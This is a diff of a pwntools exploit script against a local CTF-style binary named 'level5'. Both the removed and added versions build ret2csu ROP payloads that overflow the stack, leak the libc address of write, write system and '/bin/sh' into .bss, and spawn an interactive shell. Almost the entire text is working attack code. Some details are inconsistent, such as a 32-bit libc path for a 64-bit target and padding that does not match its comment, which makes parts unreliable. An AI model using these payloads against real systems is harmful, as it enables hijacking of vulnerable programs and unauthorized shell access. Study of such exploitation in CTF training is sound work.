@@ -1,48 +1,61 @@
 from pwn import *
-from LibcSearcher import *
 
-level5 = ELF('./level5')
-sh = process('./level5')
+elf = ELF('level5')
+libc = ELF('/usr/lib/i386-linux-gnu/libc.so.6')
+p = process('./level5')
+got_write = elf.got['write']
+print("got_write: " + hex(got_write))
+got_read = elf.got['read']
+print("got_read: " + hex(got_read))
+main = 0x400564
+off_system_addr = libc.symbols['write'] - libc.symbols['system']
+print("off_system_addr: " + hex(off_system_addr))
 
-write_got = level5.got['write'] 		#获取write函数的got地址
-read_got = level5.got['read']				#获取read函数的got地址
-main_addr = level5.symbols['main']  #获取main函数的函数地址
-bss_base = level5.bss()							#获取bss段地址
-csu_front_gadget = 0x00000000004005F0 
-#_libc_csu_init函数中位置靠前的gadget，即向rdi、rsi、rdx寄存器mov的gadget
-csu_behind_gadget = 0x0000000000400606
-#_libc_csu_init函数中位置靠后的gadget，即pop rbx、rbp、r12、r13、r14、r15寄存器的gadget
+payload1 =  b"\x00"*136
+payload1 += p64(0x400606) + p64(0) +p64(0) + p64(1) + p64(got_write) + p64(1) + p64(got_write) + p64(8) # pop_junk_rbx_rbp_r12_r13_r14_r15_ret
+payload1 += p64(0x4005F0) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]
+payload1 += b"\x00"*56
+payload1 += p64(main)
 
-#自定义csu函数，方便每一次构造payload
-def csu(fill, rbx, rbp, r12, r13, r14, r15, main):
-  #fill为填充sp指针偏移造成8字节空缺
-  #rbx, rbp, r12, r13, r14, r15皆为pop参数
-  #main为main函数地址
-    payload = b'a' * 17 			#0x80+8个字节填满栈空间至ret返回指令
-    payload += p64(csu_behind_gadget) 
-    payload += p64(fill) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
-    payload += p64(csu_front_gadget)
-    payload += b'a' * 7      #0x38个字节填充平衡堆栈造成的空缺
-    payload += p64(main)
-    sh.send(payload)    #发送payload
-    sleep(1)						#暂停等待接收
+p.recvuntil("Hello, World\n")
 
-sh.recvuntil('Hello, World\n')
-#write函数布局打印write函数地址并返回main函数
-csu(0,0, 1, write_got, 1, write_got, 8, main_addr)
+print("\n#############sending payload1#############\n")
+p.send(payload1)
+sleep(1)
 
-write_addr = u64(sh.recv(8))    #接收write函数地址
-libc = LibcSearcher('write', write_addr)	#LibcSearcher查找libc版本
-libc_base = write_addr - libc.dump('write') #计算该版本libc基地址
-execve_addr = libc_base + libc.dump('execve') #查找该版本libc execve函数地址
-log.success('execve_addr ' + hex(execve_addr))
+write_addr = u64(p.recv(8))
+print("write_addr: " + hex(write_addr))
+system_addr = write_addr - off_system_addr
+print("system_addr: " + hex(system_addr))
+bss_addr=0x601028
 
-sh.recvuntil('Hello, World\n')
-#read函数布局，将execve函数地址和/bin/sh字符串写进bss段首地址
-csu(0,0, 1, read_got, 0, bss_base, 16, main_addr)
-sh.send(p64(execve_addr) + '/bin/sh\x00')
+p.recvuntil("Hello, World\n")
 
-sh.recvuntil('Hello, World\n')
-#调用bss段中的execve('/bin/sh')
-csu(0,0, 1, bss_base, bss_base+8, 0, 0, main_addr)
-sh.interactive()
+payload2 =  b"\x00"*136
+payload2 += p64(0x400606) + p64(0) + p64(0) + p64(1) + p64(got_read) + p64(0) + p64(bss_addr) + p64(16) # pop_junk_rbx_rbp_r12_r13_r14_r15_ret
+payload2 += p64(0x4005F0) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]
+payload2 += b"\x00"*56
+payload2 += p64(main)
+
+print("\n#############sending payload2#############\n")
+p.send(payload2)
+sleep(1)
+
+p.send(p64(system_addr))
+p.send("/bin/sh\0")
+sleep(1)
+
+p.recvuntil("Hello, World\n")
+
+payload3 =  b"\x00"*136
+payload3 += p64(0x400606) + p64(0) +p64(0) + p64(1) + p64(bss_addr) + p64(bss_addr+8) + p64(0) + p64(0) # pop_junk_rbx_rbp_r12_r13_r14_r15_ret
+payload3 += p64(0x4005F0) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]
+payload3 += b"\x00"*56
+payload3 += p64(main)
+
+print("\n#############sending payload3#############\n")
+
+sleep(1)
+
+p.send(payload3)
+p.interactive()
